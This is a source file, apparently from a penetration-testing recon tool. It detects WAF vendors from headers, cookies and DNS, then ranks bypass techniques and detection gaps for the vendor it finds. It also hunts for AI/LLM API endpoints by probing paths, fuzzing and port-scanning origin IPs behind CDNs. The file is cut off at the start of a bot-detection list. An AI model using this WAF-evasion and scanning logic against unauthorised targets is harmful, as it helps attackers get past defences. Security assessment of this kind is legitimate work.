                "f5_bigip": (["F5 BIG-IP"], []),
                "modsecurity": (["ModSecurity"], []),
                "sucuri": (["Sucuri"], ["x-sucuri-id"]),
                "fastly": ([], ["x-sigsci-requestid", "fastly-io-info"]),
            }

            for vkey, (sig_names, hdr_names) in vendor_hints.items():
                if any(s in block_sigs for s in sig_names):
                    detected_vendor = vkey
                    break
                if any(h in extra_hdrs for h in hdr_names):
                    detected_vendor = vkey
                    break

            if detected_vendor and detected_vendor in vendors_db:
                vdata = vendors_db[detected_vendor]
                effective = vdata.get("bypass_techniques", {}).get("effective", [])
                ineffective = vdata.get("bypass_techniques", {}).get("ineffective", [])
                gaps = vdata.get("detection_gaps", {})
                rec_cats = vdata.get("recommended_categories", [])

                result["waf_vendor"] = vdata.get("display_name", detected_vendor)
                result["recommended_bypasses"] = [
                    {"technique": t["technique"], "confidence": t.get("confidence", "?"),
                     "description": t["description"]}
                    for t in effective[:5]
                ]
                result["ineffective_techniques"] = [t["technique"] for t in ineffective]
                result["detection_gaps"] = {
                    "signature_misses": gaps.get("signature", {}).get("misses", []),
                    "anomaly_misses": gaps.get("anomaly", {}).get("misses", []),
                }
                result["recommended_categories"] = rec_cats
                result["recommended_delay"] = vdata.get("recommended_delay", 0.5)
        except Exception:
            pass  # Intel lookup is best-effort
    else:
        result["detection_mode"] = "none"
        result["blocked_fingerprint"] = {}

    return result


# ── WAF Rule Gap Analysis ─────────────────────────────────────────────────

def waf_gap_analysis(
    waf_vendor: Optional[str] = None,
    recon_result: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """Cross-reference detected WAF vendor against waf_intel knowledge base.

    Produces a prioritised list of bypass techniques, detection gaps,
    and concrete payload recommendations specific to the identified vendor.

    Works in three tiers:
      1. Explicit *waf_vendor* argument (from detector.py or user input).
      2. Vendor inferred from differential analysis (recon_result["differential"]).
      3. Vendor inferred from response headers / DNS / cookies in *recon_result*.

    Returns a dict suitable for inclusion in recon output and print_recon display.
    """
    from fray import load_waf_intel

    result: Dict[str, Any] = {
        "waf_vendor": None,
        "vendor_key": None,
        "detection_mode": None,
        "block_behavior": {},
        "bypass_strategies": [],      # prioritised, with confidence
        "ineffective_techniques": [],  # skip these — save time
        "detection_gaps": {
            "signature_misses": [],
            "anomaly_misses": [],
        },
        "technique_matrix": [],       # check/x per technique for this vendor
        "recommended_categories": [],
        "recommended_delay": None,
        "risk_summary": None,
        "error": None,
    }

    intel = load_waf_intel()
    vendors_db = intel.get("vendors", {})
    technique_matrix = intel.get("technique_matrix", {})

    if not vendors_db:
        result["error"] = "waf_intel.json not found or empty"
        return result

    # ── Tier 1: explicit vendor name ──
    vendor_key = _resolve_vendor_key(waf_vendor, vendors_db) if waf_vendor else None

    # ── Tier 2: from differential analysis ──
    if not vendor_key and recon_result:
        diff = recon_result.get("differential", {})
        diff_vendor = diff.get("waf_vendor")
        if diff_vendor:
            vendor_key = _resolve_vendor_key(diff_vendor, vendors_db)

    # ── Tier 3: infer from headers / DNS / cookies ──
    if not vendor_key and recon_result:
        vendor_key = _infer_vendor_from_recon(recon_result, vendors_db)

    if not vendor_key:
        result["risk_summary"] = "No WAF vendor identified \u2014 gap analysis requires a known vendor"
        return result

    vdata = vendors_db[vendor_key]
    result["waf_vendor"] = vdata.get("display_name", vendor_key)
    result["vendor_key"] = vendor_key
    result["detection_mode"] = (vdata.get("detection_mode") or "").lower() or None
    result["block_behavior"] = vdata.get("block_behavior", {})
    result["recommended_delay"] = vdata.get("recommended_delay")
    result["recommended_categories"] = vdata.get("recommended_categories", [])

    # ── Bypass strategies — merge intel with differential findings ──
    effective = vdata.get("bypass_techniques", {}).get("effective", [])
    ineffective = vdata.get("bypass_techniques", {}).get("ineffective", [])

    # Enrich with differential results if available
    diff_sigs = []
    diff_anoms = []
    if recon_result:
        diff = recon_result.get("differential", {})
        diff_sigs = [s["label"] for s in diff.get("signature_detection", [])]
        diff_anoms = [a["label"] for a in diff.get("anomaly_detection", [])]

    for tech in effective:
        entry = {
            "technique": tech["technique"],
            "confidence": tech.get("confidence", "unknown"),
            "description": tech["description"],
            "payload_example": tech.get("payload_example", ""),
            "notes": tech.get("notes", ""),
        }
        # Boost confidence if differential analysis confirmed the gap
        if tech["technique"] == "double_encoding" and not diff_anoms:
            entry["live_confirmed"] = True
            if entry["confidence"] == "medium":
                entry["confidence"] = "high"
        result["bypass_strategies"].append(entry)

    result["ineffective_techniques"] = [
        {"technique": t["technique"], "reason": t.get("description", "")}
        for t in ineffective
    ]

    # ── Detection gaps ──
    gaps = vdata.get("detection_gaps", {})
    sig_gaps = gaps.get("signature", {})
    anom_gaps = gaps.get("anomaly", {})

    result["detection_gaps"]["signature_misses"] = sig_gaps.get("misses", [])
    result["detection_gaps"]["anomaly_misses"] = anom_gaps.get("misses", [])

    # Cross-check: if differential analysis showed a payload category was NOT
    # blocked, and intel says it should be, flag as a configuration gap.
    sig_blocks = sig_gaps.get("blocks", [])
    config_gaps = []
    for label in ("XSS", "SQLi", "Path Traversal", "Command Injection", "SSTI"):
        if label in sig_blocks and label not in diff_sigs and diff_sigs:
            config_gaps.append(f"{label} expected to be blocked but was not \u2014 possible config gap")
    if config_gaps:
        result["detection_gaps"]["config_gaps"] = config_gaps

    # ── Technique matrix — check/x for this vendor ──
    for tech_name, tech_data in technique_matrix.items():
        if not isinstance(tech_data, dict):
            continue
        effective_against = tech_data.get("effective_against", [])
        blocked_by = tech_data.get("blocked_by", [])
        if vendor_key in effective_against:
            result["technique_matrix"].append({
                "technique": tech_name,
                "status": "effective",
                "notes": tech_data.get("notes", ""),
            })
        elif vendor_key in blocked_by:
            result["technique_matrix"].append({
                "technique": tech_name,
                "status": "blocked",
                "notes": tech_data.get("notes", ""),
            })
        else:
            result["technique_matrix"].append({
                "technique": tech_name,
                "status": "untested",
                "notes": tech_data.get("notes", ""),
            })

    # ── Risk summary ──
    n_effective = sum(1 for s in result["bypass_strategies"] if s["confidence"] in ("high", "medium"))
    n_sig_gaps = len(result["detection_gaps"]["signature_misses"])
    n_anom_gaps = len(result["detection_gaps"]["anomaly_misses"])
    n_config = len(result["detection_gaps"].get("config_gaps", []))

    if n_effective >= 3 or n_sig_gaps >= 2:
        result["risk_summary"] = f"HIGH \u2014 {n_effective} viable bypass techniques, {n_sig_gaps} signature gaps, {n_anom_gaps} anomaly gaps"
    elif n_effective >= 1 or n_sig_gaps >= 1:
        result["risk_summary"] = f"MEDIUM \u2014 {n_effective} viable bypass techniques, {n_sig_gaps + n_anom_gaps} detection gaps"
    else:
        result["risk_summary"] = f"LOW \u2014 no high-confidence bypasses identified, {n_sig_gaps + n_anom_gaps} potential gaps"
    if n_config:
        result["risk_summary"] += f", {n_config} config discrepancies"

    return result


def _resolve_vendor_key(vendor_name: str, vendors_db: Dict[str, Any]) -> Optional[str]:
    """Resolve a display name or alias to a waf_intel vendor key."""
    name_lower = vendor_name.lower()
    # Exact key match
    if name_lower.replace(" ", "_") in vendors_db:
        return name_lower.replace(" ", "_")
    # Substring match on key
    for key in vendors_db:
        if key.replace("_", " ") in name_lower or name_lower in key.replace("_", " "):
            return key
    # Match on display_name
    for key, data in vendors_db.items():
        if name_lower in data.get("display_name", "").lower():
            return key
    return None


def _infer_vendor_from_recon(recon: Dict[str, Any], vendors_db: Dict[str, Any]) -> Optional[str]:
    """Try to identify WAF vendor from response headers, DNS, and cookies."""
    # Check response headers
    headers = recon.get("headers", {})
    raw_headers = headers.get("raw_headers", {}) if isinstance(headers, dict) else {}

    # Flatten all header keys we've seen
    all_header_keys = set()
    if isinstance(raw_headers, dict):
        all_header_keys.update(k.lower() for k in raw_headers.keys())

    # Also check from the page fetch headers stored elsewhere
    page_headers = recon.get("page_headers", {})
    if isinstance(page_headers, dict):
        all_header_keys.update(k.lower() for k in page_headers.keys())

    # DNS/CDN info
    dns_info = recon.get("dns", {})
    cdn = dns_info.get("cdn_detected", "")
    cnames = dns_info.get("cname", [])
    cname_str = " ".join(cnames).lower() if cnames else ""

    # Cookie names
    cookies = recon.get("cookies", {})
    cookie_names = set()
    if isinstance(cookies, dict):
        for c in cookies.get("cookies", []):
            if isinstance(c, dict):
                cookie_names.add(c.get("name", "").lower())

    # ── Strip headers injected by user's own ZT/VPN/SASE proxy ──
    # These are added by the scanning machine's security stack, NOT the target.
    # Treating them as target WAF indicators causes false positives.
    zt_proxy_headers = {
        # Cloudflare Zero Trust / WARP
        "cf-team", "cf-access-authenticated-user-email", "cf-access-jwt-assertion",
        "cf-warp-tag-id", "cf-connecting-ip",
        # Zscaler ZIA / ZPA
        "x-zscaler-client", "x-zscaler-transactionid", "z-forwarded-for",
        "x-zscaler-ia", "x-zscaler-sans",
        # Netskope
        "x-netskope-client", "x-netskope-transactionid", "ns-client-ip",
        "x-netskope-activity-id",
        # Palo Alto Prisma Access / GlobalProtect
        "x-pan-session-id", "x-panw-region", "x-prisma-access",
        # Cisco Umbrella / Secure Access
        "x-umbrella-orgid", "x-umbrella-identity",
        # Menlo Security
        "x-menlo-security", "x-menlo-client",
        # Generic proxy timing (often ZT-injected)
        "server-timing",  # cfReqDur, etc.
    }
    # Remove ZT headers from detection pool so they don't trigger false vendor match
    all_header_keys -= zt_proxy_headers

    # Also strip ZT-injected cookies
    zt_proxy_cookies = {
        "cf_bm",  # Cloudflare bot management (can be ZT-injected)
    }

    # Header-based vendor detection (ZT headers already excluded above)
    header_vendor_map = {
        "cloudflare": ["cf-ray", "cf-cache-status", "cf-mitigated"],
        "aws_waf": ["x-amzn-waf-action", "x-amz-cf-id", "x-amzn-requestid", "x-amz-cf-pop"],
        "azure_waf": ["x-azure-ref", "x-msedge-ref", "x-azure-fdid"],
        "akamai": ["akamai-origin-hop", "x-akamai-transformed"],
        "imperva": ["x-cdn", "x-iinfo"],
        "fastly": ["x-fastly-request-id", "fastly-io-info", "x-sigsci-requestid"],
        "sucuri": ["x-sucuri-id", "x-sucuri-cache"],
        "f5_bigip": ["x-wa-info", "x-cnection"],
    }

    for vendor_key, hdr_indicators in header_vendor_map.items():
        if any(h in all_header_keys for h in hdr_indicators):
            if vendor_key in vendors_db:
                return vendor_key

    # Cookie-based detection
    cookie_vendor_map = {
        "cloudflare": ["__cfduid", "__cflb", "cf_clearance"],
        "aws_waf": ["awsalb", "awsalbcors"],
        "azure_waf": ["arr_affinity", "arraffinitysamesite"],
        "akamai": ["ak_bmsc", "bm_sv", "bm_sz"],
        "imperva": ["incap_ses", "visid_incap"],
        "f5_bigip": ["bigipserver", "f5_cspm"],
        "sucuri": ["sucuri_cloudproxy_uuid"],
    }

    for vendor_key, cookie_indicators in cookie_vendor_map.items():
        if any(c in cookie_names for c in cookie_indicators):
            if vendor_key in vendors_db:
                return vendor_key

    # CNAME / CDN based detection
    if cdn:
        cdn_lower = cdn.lower()
        if "cloudflare" in cdn_lower:
            return "cloudflare"
        if "cloudfront" in cdn_lower or "aws" in cdn_lower:
            return "aws_waf"
        if "akamai" in cdn_lower:
            return "akamai"
        if "azure" in cdn_lower:
            return "azure_waf"
        if "fastly" in cdn_lower:
            return "fastly"
        if "sucuri" in cdn_lower:
            return "sucuri"
        if "imperva" in cdn_lower or "incapsula" in cdn_lower:
            return "imperva"

    if "cloudflare" in cname_str:
        return "cloudflare"
    if "akamai" in cname_str:
        return "akamai"
    if "cloudfront" in cname_str:
        return "aws_waf"
    if "azureedge" in cname_str or "azurefd" in cname_str:
        return "azure_waf"

    return None


# ---------------------------------------------------------------------------
# AI / LLM Endpoint Discovery
# ---------------------------------------------------------------------------

# Technique #1: Common AI API path patterns
_AI_API_PATHS: List[Tuple[str, str]] = [
    # OpenAI-compatible
    ("/v1/chat/completions", "openai_compat"),
    ("/v1/completions", "openai_compat"),
    ("/v1/embeddings", "openai_compat"),
    ("/v1/models", "openai_compat"),
    ("/v1/images/generations", "openai_compat"),
    ("/v1/audio/transcriptions", "openai_compat"),
    ("/v1/messages", "anthropic_compat"),
    # Common proxy / gateway paths
    ("/api/v1/chat", "ai_chat"),
    ("/api/v1/completions", "ai_chat"),
    ("/api/chat/completions", "ai_chat"),
    ("/api/chat", "ai_chat"),
    ("/api/ai/chat", "ai_chat"),
    ("/api/ai/generate", "ai_chat"),
    ("/api/ai/completions", "ai_chat"),
    ("/api/openai/v1/chat/completions", "openai_proxy"),
    ("/api/openai/chat/completions", "openai_proxy"),
    ("/proxy/openai/v1/chat/completions", "openai_proxy"),
    ("/api/anthropic/v1/messages", "anthropic_proxy"),
    ("/api/gpt/chat", "gpt_proxy"),
    ("/backend/llm", "llm_backend"),
    ("/backend/ai", "llm_backend"),
    # Ollama
    ("/api/generate", "ollama"),
    ("/api/chat", "ollama"),
    ("/api/tags", "ollama"),
    ("/api/show", "ollama"),
    # LiteLLM
    ("/chat/completions", "litellm"),
    ("/completions", "litellm"),
    ("/models", "litellm"),
    # OpenWebUI / LocalAI
    ("/api/v1/auths/signin", "openwebui"),
    ("/ollama/api/tags", "openwebui"),
    # LangServe / LangChain
    ("/invoke", "langserve"),
    ("/batch", "langserve"),
    ("/stream", "langserve"),
    # Generic AI/ML inference
    ("/ai/generate", "ai_inference"),
    ("/ai/predict", "ai_inference"),
    ("/ai/infer", "ai_inference"),
    ("/llm/query", "ai_inference"),
    ("/llm/generate", "ai_inference"),
    ("/predict", "ai_inference"),
    ("/infer", "ai_inference"),
    ("/generate", "ai_inference"),
    ("/embed", "ai_inference"),
    # Hugging Face / Gradio
    ("/api/predict", "huggingface"),
    ("/run/predict", "gradio"),
    ("/api/queue/push", "gradio"),
    # Vector DB endpoints
    ("/collections", "vector_db"),
    ("/points/search", "vector_db"),
    ("/points", "vector_db"),
    ("/namespaces", "vector_db"),
    # Well-known AI config
    ("/.well-known/openid-configuration", "openid_ai"),
    ("/.well-known/ai-plugin.json", "chatgpt_plugin"),
    # OpenAI API specific paths
    ("/v1/assistants", "openai_assistants"),
    ("/v1/threads", "openai_assistants"),
    ("/v1/fine-tuning/jobs", "openai_finetuning"),
    ("/v1/files", "openai_files"),
    ("/v1/batches", "openai_batch"),
    ("/v1/responses", "openai_compat"),         # OpenAI Responses API (new 2025)
    ("/v1/moderations", "openai_moderation"),
    # Anthropic specific paths
    ("/v1/complete", "anthropic_compat"),        # Legacy Anthropic
    ("/v1/messages/batches", "anthropic_batch"),
    # Google Gemini / Vertex AI
    ("/v1beta/models", "gemini"),
    ("/v1/models", "vertex_ai"),
    ("/generate", "gemini"),
    # Mistral AI
    ("/v1/agents/completions", "mistral"),
    # Cohere
    ("/v1/chat", "cohere"),
    ("/v1/generate", "cohere"),
    ("/v1/embed", "cohere"),
    ("/v1/classify", "cohere"),
    # Groq
    ("/openai/v1/chat/completions", "groq"),
    # Azure OpenAI Service
    ("/openai/deployments", "azure_openai"),
    ("/openai/models", "azure_openai"),
    # Together AI
    ("/v1/chat/completions", "together_ai"),   # already there but explicit
    ("/inference", "together_ai"),
    # Replicate
    ("/v1/predictions", "replicate"),
    ("/v1/models", "replicate"),
    # LangServe / FastAPI AI
    ("/chain/invoke", "langserve"),
    ("/agent/invoke", "langserve"),
    ("/rag/invoke", "langserve"),
    # Vercel AI SDK
    ("/api/chat", "vercel_ai"),
    ("/api/completion", "vercel_ai"),
    ("/api/stream", "vercel_ai"),
    # Flowise / n8n / Zapier AI
    ("/api/v1/prediction", "flowise"),
    ("/api/v1/vector/upsert", "flowise"),
    # Cloudflare AI Gateway
    ("/ai/run/@cf/", "cloudflare_workers_ai"),
    # HuggingFace Inference API
    ("/models", "huggingface_api"),
    ("/pipeline/feature-extraction", "huggingface_api"),
    # OpenRouter
    ("/api/v1/chat/completions", "openrouter"),
    # Portkey / Helicone AI Gateway
    ("/v1/chat/completions", "ai_gateway_proxy"),  # already there
    # RAG-specific
    ("/api/rag", "rag_endpoint"),
    ("/api/search", "rag_search"),
    ("/api/retrieval", "rag_retrieval"),
    ("/api/knowledge", "rag_knowledge"),
]

# Technique #9: Fuzzing seeds — combined with path prefixes
_AI_FUZZ_SEEDS = [
    "completions", "chat", "generate", "infer", "predict", "embed",
    "query", "llm", "ai", "gpt", "claude", "prompt", "model", "models",
    "assistant", "agent", "copilot", "rag", "search",
]
_AI_FUZZ_PREFIXES = ["/api/", "/api/v1/", "/v1/", "/"]

# Technique #4: Response body fingerprints — indicators of LLM responses
_AI_RESPONSE_PATTERNS = [
    (re.compile(r'"choices"\s*:\s*\['), "openai_response"),
    (re.compile(r'"usage"\s*:\s*\{[^}]*"prompt_tokens"'), "openai_response"),
    (re.compile(r'"completion_tokens"\s*:\s*\d+'), "openai_response"),
    (re.compile(r'"model"\s*:\s*"(gpt-|claude-|llama|mistral|gemma|phi-)'), "llm_model"),
    (re.compile(r'"content"\s*:\s*\[.*?"type"\s*:\s*"text"'), "anthropic_response"),
    (re.compile(r'"stop_reason"\s*:\s*"end_turn"'), "anthropic_response"),
    (re.compile(r'"object"\s*:\s*"(chat\.completion|text_completion|embedding|list)"'), "openai_object"),
    (re.compile(r'data:\s*\{"id":"chatcmpl-'), "openai_streaming"),
    (re.compile(r'data:\s*\{"model"\s*:\s*"(gpt-|claude-)'), "llm_streaming"),
    (re.compile(r'"embedding"\s*:\s*\[[\d\.\-,\s]+\]'), "embedding_response"),
    (re.compile(r'"models"\s*:\s*\[.*?"name"\s*:\s*"'), "model_listing"),
    (re.compile(r'"modelfile"\s*:'), "ollama_response"),
    (re.compile(r'"done"\s*:\s*(true|false).*"total_duration"'), "ollama_response"),
    (re.compile(r'"response"\s*:\s*".*"done"'), "ollama_response"),
]

# Technique #8: AI-specific headers indicating proxy/gateway to AI backends
_AI_PROXY_HEADERS = {
    "openai-organization": "openai",
    "openai-model": "openai",
    "openai-processing-ms": "openai",
    "openai-version": "openai",
    "x-openai-thread-id": "openai",
    "anthropic-ratelimit-tokens-limit": "anthropic",
    "anthropic-ratelimit-requests-limit": "anthropic",
    "x-ratelimit-limit-tokens": "llm_api",
    "x-ratelimit-remaining-tokens": "llm_api",
    "x-ratelimit-limit-requests": "llm_api",
    "x-groq-id": "groq",
    "cf-aig-cache-status": "cloudflare_ai_gateway",
    "cf-aig-serving": "cloudflare_ai_gateway",
    "x-kong-upstream-latency": "ai_gateway",
    "x-kong-proxy-latency": "ai_gateway",
    "x-litellm-model-id": "litellm",
    "x-litellm-cache-key": "litellm",
    "x-model-id": "llm_api",
    "x-inference-time": "ai_inference",
    "x-model-version": "llm_api",
    "x-request-id": "_maybe_ai",  # common in AI APIs — checked with other signals
}

# Technique #7: Self-hosted AI service ports
_AI_PORTS: List[Tuple[int, str, str]] = [
    (11434, "/api/tags",          "ollama"),
    (11434, "/api/version",       "ollama"),
    (8080,  "/v1/models",         "localai"),
    (8080,  "/models",            "localai"),
    (3000,  "/v1/models",         "litellm"),
    (3000,  "/models",            "litellm"),
    (1234,  "/v1/models",         "lm_studio"),
    (1234,  "/v1/chat/completions", "lm_studio"),
    (5000,  "/v1/models",         "flask_ai"),
    (5000,  "/api/predict",       "flask_ai"),
    (8000,  "/v1/models",         "fastapi_ai"),
    (8000,  "/docs",              "fastapi_ai"),
    (7860,  "/api/predict",       "gradio"),
    (7860,  "/info",              "gradio"),
    (8501,  "/healthz",           "streamlit"),
    (9090,  "/v2/models",         "triton"),
    (8501,  "/_stcore/health",    "streamlit"),
]


def check_ai_endpoints(host: str, port: int, use_ssl: bool,
                       timeout: int = 5,
                       extra_headers: Optional[Dict[str, str]] = None,
                       origin_ips: Optional[List[str]] = None,
                       ) -> Dict[str, Any]:
    """Discover AI/LLM endpoints via path probing, response fingerprinting,
    header leakage detection, self-hosted port scanning, and fuzzing.

    Implements techniques:
      #1 — Common AI API path probing
      #2/#4 — Request/response fingerprinting
      #7 — Self-hosted AI port scanning (Ollama, LocalAI, LiteLLM, etc.)
      #8 — API gateway/proxy header leakage
      #9 — AI endpoint fuzzing with wordlist seeds

    Returns:
        Dict with 'endpoints', 'ai_headers', 'port_scan', 'technologies',
        and 'summary' keys.
    """
    from fray.recon.http import _fetch_url
    import concurrent.futures

    scheme = "https" if use_ssl else "http"
    port_str = "" if (use_ssl and port == 443) or (not use_ssl and port == 80) else f":{port}"
    base = f"{scheme}://{host}{port_str}"

    found_endpoints: List[Dict[str, Any]] = []
    ai_headers_found: Dict[str, str] = {}  # header -> detected service
    technologies_detected: set = set()
    seen_paths: set = set()

    def _classify_response(status: int, body: str, hdrs: dict,
                           path: str, category: str) -> Optional[Dict[str, Any]]:
        """Analyze a response for AI/LLM indicators."""
        if status == 0 or status == 404 or status >= 500:
            return None

        lower_body = body.lower() if body else ""
        ct = hdrs.get("content-type", "")

        # Technique #8: Check response headers for AI proxy indicators
        path_ai_headers = {}
        for hdr_name, svc in _AI_PROXY_HEADERS.items():
            val = hdrs.get(hdr_name, "")
            if val:
                if hdr_name == "x-request-id" and svc == "_maybe_ai":
                    # x-request-id alone is not conclusive — only flag with other signals
                    continue
                path_ai_headers[hdr_name] = val
                ai_headers_found[hdr_name] = svc
                technologies_detected.add(svc)

        # Technique #4: Check body for AI response patterns
        body_signals = []
        for pat, sig_type in _AI_RESPONSE_PATTERNS:
            if pat.search(body or ""):
                body_signals.append(sig_type)
                technologies_detected.add(sig_type)

        # Check SSE streaming indicator
        is_sse = "text/event-stream" in ct
        if is_sse and ("data:" in (body or "")):
            body_signals.append("sse_streaming")

        # Determine if this is an AI endpoint
        is_ai = bool(body_signals) or bool(path_ai_headers)

        # Also accept 200 + JSON with model/chat-like content for known paths
        if not is_ai and status == 200 and "json" in ct:
            if any(k in lower_body for k in (
                '"model"', '"models"', '"prompt"', '"messages"',
                '"temperature"', '"max_tokens"', '"tokens"',
                '"embedding"', '"inference"',
            )):
                is_ai = True
                body_signals.append("json_ai_keywords")

        # Accept 401/403 on known AI paths — protected AI endpoint
        if not is_ai and status in (401, 403) and category != "fuzz":
            is_ai = True
            body_signals.append("protected")

        # Accept redirects on known AI paths
        if not is_ai and status in (301, 302, 303, 307, 308) and category != "fuzz":
            loc = hdrs.get("location", "")
            if any(k in loc.lower() for k in ("auth", "login", "sso", "oauth")):
                is_ai = True
                body_signals.append("auth_redirect")

        if not is_ai:
            return None

        entry: Dict[str, Any] = {
            "path": path,
            "status": status,
            "category": category,
            "signals": body_signals,
        }
        if path_ai_headers:
            entry["ai_headers"] = path_ai_headers
        if status in (401, 403):
            entry["protected"] = True
            www_auth = hdrs.get("www-authenticate", "")
            if www_auth:
                entry["auth_scheme"] = www_auth.split()[0]
        if status in (301, 302, 303, 307, 308):
            entry["redirect"] = hdrs.get("location", "")
        return entry

    def _probe_path(path: str, category: str) -> Optional[Dict[str, Any]]:
        """Probe a single path on the target."""
        if path in seen_paths:
            return None
        seen_paths.add(path)
        url = f"{base}{path}"
        try:
            status, body, hdrs = _fetch_url(url, timeout=timeout,
                                             verify_ssl=True,
                                             headers=extra_headers)
            if status == 0 and use_ssl:
                status, body, hdrs = _fetch_url(url, timeout=timeout,
                                                 verify_ssl=False,
                                                 headers=extra_headers)
        except Exception:
            return None
        return _classify_response(status, body, hdrs, path, category)

    # ── Phase 1: Probe known AI API paths (technique #1) ──
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
        futures = {
            pool.submit(_probe_path, path, cat): (path, cat)
            for path, cat in _AI_API_PATHS
        }
        for f in concurrent.futures.as_completed(futures, timeout=timeout * 4):
            try:
                result = f.result()
                if result:
                    found_endpoints.append(result)
            except Exception:
                pass

    # ── Phase 2: AI endpoint fuzzing (technique #9) ──
    # Only fuzz paths we haven't already probed
    fuzz_paths = []
    for prefix in _AI_FUZZ_PREFIXES:
        for seed in _AI_FUZZ_SEEDS:
            p = f"{prefix}{seed}"
            if p not in seen_paths:
                fuzz_paths.append(p)
    # Limit fuzz to avoid excessive requests
    fuzz_paths = fuzz_paths[:40]

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
        futures = {
            pool.submit(_probe_path, p, "fuzz"): p
            for p in fuzz_paths
        }
        for f in concurrent.futures.as_completed(futures, timeout=timeout * 3):
            try:
                result = f.result()
                if result:
                    found_endpoints.append(result)
            except Exception:
                pass

    # ── Phase 3: Self-hosted AI port scan (technique #7) ──
    port_scan_results: List[Dict[str, Any]] = []
    scan_targets: List[str] = []
    # Scan origin IPs if available (behind WAF/CDN)
    if origin_ips:
        for ip in origin_ips[:3]:
            scan_targets.append(ip)
    # Also try the host itself
    scan_targets.append(host)

    def _probe_port(target_ip: str, ai_port: int, probe_path: str,
                    svc_name: str) -> Optional[Dict[str, Any]]:
        """Try to connect to a self-hosted AI service port."""
        # Quick TCP check first
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(min(timeout, 3))
        try:
            sock.connect((target_ip, ai_port))
            sock.close()
        except (socket.error, OSError):
            return None
        finally:
            try:
                sock.close()
            except Exception:
                pass

        # Port is open — try HTTP probe
        url = f"http://{target_ip}:{ai_port}{probe_path}"
        try:
            status, body, hdrs = _fetch_url(url, timeout=min(timeout, 3),
                                             verify_ssl=False)
        except Exception:
            return {"ip": target_ip, "port": ai_port, "service": svc_name,
                    "status": "open", "detail": "Port open, HTTP probe failed"}

        if status == 0:
            return {"ip": target_ip, "port": ai_port, "service": svc_name,
                    "status": "open", "detail": "Port open, no HTTP response"}

        entry = {"ip": target_ip, "port": ai_port, "service": svc_name,
                 "status": "confirmed" if status == 200 else f"http_{status}",
                 "path": probe_path, "http_status": status}

        # Check body for confirmation
        for pat, sig_type in _AI_RESPONSE_PATTERNS:
            if pat.search(body or ""):
                entry["confirmed"] = True
                entry["signal"] = sig_type
                technologies_detected.add(svc_name)
                break
        # Ollama version check
        if svc_name == "ollama" and status == 200:
            if "ollama" in (body or "").lower() or '"models"' in (body or ""):
                entry["confirmed"] = True
                technologies_detected.add("ollama")
        # Gradio/Streamlit check
        if svc_name in ("gradio", "streamlit") and status == 200:
            if svc_name in (body or "").lower():
                entry["confirmed"] = True
                technologies_detected.add(svc_name)
        # FastAPI docs check
        if probe_path == "/docs" and status == 200:
            if "swagger" in (body or "").lower() or "openapi" in (body or "").lower():
                entry["confirmed"] = True
                entry["signal"] = "fastapi_docs"

        return entry

    with concurrent.futures.ThreadPoolExecutor(max_workers=6) as pool:
        port_futures = {}
        for target_ip in scan_targets:
            for ai_port, probe_path, svc_name in _AI_PORTS:
                f = pool.submit(_probe_port, target_ip, ai_port, probe_path, svc_name)
                port_futures[f] = (target_ip, ai_port, svc_name)
        for f in concurrent.futures.as_completed(port_futures, timeout=timeout * 3):
            try:
                result = f.result()
                if result:
                    port_scan_results.append(result)
            except Exception:
                pass

    # ── Phase 4: Technique #8 — Check main page headers for AI proxy leakage ──
    # Already captured during path probing; also check the main page
    try:
        status, body, hdrs = _fetch_url(f"{base}/", timeout=timeout,
                                         verify_ssl=True,
                                         headers=extra_headers)
        for hdr_name, svc in _AI_PROXY_HEADERS.items():
            val = hdrs.get(hdr_name, "")
            if val and svc != "_maybe_ai":
                ai_headers_found[hdr_name] = svc
                technologies_detected.add(svc)
        # Also look for AI JS SDK references in the main page body (technique #2)
        _JS_AI_PATTERNS = [
            (re.compile(r'openai\.com/v1|api\.openai\.com', re.I), "openai_js"),
            (re.compile(r'anthropic\.com/v1|api\.anthropic\.com', re.I), "anthropic_js"),
            (re.compile(r'api\.cohere\.ai|cohere\.com', re.I), "cohere_js"),
            (re.compile(r'api\.groq\.com|groq\.com/openai', re.I), "groq_js"),
            (re.compile(r'api\.mistral\.ai', re.I), "mistral_js"),
            (re.compile(r'generativelanguage\.googleapis\.com|ai\.google', re.I), "google_ai_js"),
            (re.compile(r'api\.replicate\.com', re.I), "replicate_js"),
            (re.compile(r'api\.together\.xyz|together\.ai', re.I), "together_js"),
            (re.compile(r'inference\.huggingface\.co|api-inference\.huggingface', re.I), "huggingface_js"),
            (re.compile(r'ollama\.(?:ai|com)|localhost:11434', re.I), "ollama_js"),
            (re.compile(r'litellm|\/chat\/completions', re.I), "litellm_js"),
            (re.compile(r'langchain|langserve|langsmith', re.I), "langchain_js"),
            (re.compile(r'pinecone\.io|pinecone-client', re.I), "pinecone_js"),
            (re.compile(r'weaviate\.io|weaviate-client', re.I), "weaviate_js"),
            (re.compile(r'qdrant\.tech|qdrant-js', re.I), "qdrant_js"),
        ]
        for pat, tech in _JS_AI_PATTERNS:
            if pat.search(body or ""):
                technologies_detected.add(tech)
    except Exception:
        pass

    # ── Build summary ──
    confirmed_endpoints = [e for e in found_endpoints if e.get("signals")]
    confirmed_ports = [p for p in port_scan_results if p.get("confirmed")]
    open_ai_ports = [p for p in port_scan_results
                     if p.get("status") in ("open", "confirmed") or
                     (isinstance(p.get("http_status"), int) and p["http_status"] < 500)]

    return {
        "endpoints": found_endpoints,
        "ai_headers": dict(ai_headers_found),
        "port_scan": port_scan_results,
        "open_ports": open_ai_ports,
        "confirmed_ports": confirmed_ports,
        "technologies": sorted(technologies_detected),
        "total_probed": len(seen_paths),
        "total_found": len(found_endpoints),
        "total_confirmed_ports": len(confirmed_ports),
        "summary": (f"{len(found_endpoints)} AI endpoint(s) found, "
                    f"{len(ai_headers_found)} AI header(s) detected, "
                    f"{len(open_ai_ports)} open AI port(s), "
                    f"{len(confirmed_ports)} confirmed self-hosted service(s)"),
    }


# ---------------------------------------------------------------------------
# Bot / Anti-Automation Detection (#52, #53, #54)
# Research-accurate per-vendor signatures from official docs and
# reverse-engineering analysis.  Each vendor entry documents:
#   - Detection method (cookie / JS / header / body pattern)
#   - How the vendor actually detects bots
# ---------------------------------------------------------------------------

# Per-vendor comprehensive detection profiles
# Each: (vendor_id, label, detection_method, cookies, js_patterns, header_keys, body_patterns)
_BOT_VENDORS = [
    # ── Cloudflare ─────────────────────────────────────────────────────
